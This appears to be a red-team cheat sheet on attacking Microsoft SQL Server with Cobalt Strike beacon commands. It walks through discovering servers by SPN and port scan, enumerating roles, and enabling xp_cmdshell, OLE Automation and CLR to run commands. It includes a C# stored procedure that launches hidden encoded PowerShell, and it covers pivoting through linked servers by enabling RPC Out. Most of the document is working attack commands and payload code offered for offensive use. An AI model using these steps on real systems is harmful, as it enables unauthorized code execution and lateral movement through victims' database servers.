# Microsoft MSSQL Server

## Enumeration

- Find MS SQL server:

```shell
# Using SPN
beacon> ldapsearch (&(samAccountType=805306368)(servicePrincipalName=MSSQLSvc*)) --attributes name,samAccountName,servicePrincipalName

# Using portscan
beacon> portscan $SUBNET 1433 arp 1024
```

- Enumerating the server:

```shell
beacon> sql-1434udp $IP
beacon> sql-info $HOSTNAME
```

- Enumerate roles:

```shell
beacon> sql-whoami lon-db-1
```

- Query:

```shell
beacon> sql-query lon-db-1 "$QUERY"
```

## Code Execution

- Using `xp_cmdshell`

```shell
# Check xp_cmdshell status
beacon> sql-query $HOSTNAME "SELECT name,value FROM sys.configurations WHERE name = 'xp_cmdshell'"

# Enable xp_cmdshell
beacon> sql-enablexp $HOSTNAME
beacon> sql-disablexp $HOSTNAME

# Running commands
sql-xpcmd $HOSTNAME "$COMMAND"
```

- Using OLE Automation

```shell
# Check OLE automation
beacon> sql-query lon-db-1 "SELECT name,value FROM sys.configurations WHERE name = 'Ole Automation Procedures'"

# Enabling OLE automation
beacon> sql-enableole $HOSTNAME
beacon> sql-disableole $HOSTNAME

# Run commands
beacon> sql-olecmd $HOSTNAME "$COMMAND"
```

- Common Language Runtime

```shell
# Check CLR
beacon> sql-query $HOSTNAME "SELECT value FROM sys.configurations WHERE name = 'clr enabled'

# Enable CLR
beacon> sql-enableclr
beacon> sql-disableclr

# Run Commands
beacon> sql-clr $HOSTNAME $PATH_TO_DLL MyProcedure
```

```csharp
public partial class StoredProcedures
{
    [SqlProcedure]
    public static void MyProcedure()
    {
        var psi = new ProcessStartInfo
        {
            FileName = @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            Arguments = "-w hidden -nop -enc ..."
        };
        
        Process.Start(psi);
    }
}
```

## Linked Servers

```shell
# Check links
beacon> sql-links $HOSTNAME

# Execute commands on linked server
beacon> sql-query $HOSTNAME "SELECT @@SERVERNAME" "" $LINKED_SERVER_HOSTNAME

# Enumerate linked servers
beacon> sql-whoami $HOSTNAME "" $LINKED_SERVER_HOSTNAME
```

```shell
#  However, this will fail if RPC Out is not enabled on the link,
# as it's required in order to call stored procedures on the linked server.
beacon> sql-checkrpc $HOSTNAME
beacon> sql-enablerpc $HOSTNAME $LINKED_SERVER_HOSTNAME
```